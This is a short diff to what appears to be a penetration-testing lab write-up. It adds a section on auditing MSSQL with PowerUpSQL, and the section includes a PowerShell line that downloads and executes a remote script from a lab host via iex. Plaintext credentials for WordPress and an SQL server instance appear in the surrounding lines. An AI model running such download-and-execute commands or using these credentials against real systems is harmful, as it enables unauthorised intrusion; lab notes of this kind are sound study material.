@@ -946,3 +946,15 @@ Go to /wp-login.php (admin:P@ssw0rd123!)
 <figure><img src="../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>
 
 </details>
+
+<details>
+
+<summary>Checking for MSSQL misconfigurations (PowerUpSQL)</summary>
+
+```powershell
+iex (new-object net.webclient).downloadstring('http://10.10.14.2/PowerUpSQL.ps1')
+Invoke-SQLAudit
+# Invoke-SQLAudit -Instance ZPH-SVRSQL01.zsm.local -Verbose -username zabbix -password rDhHbBEfh35sMbkY
+```
+
+</details>
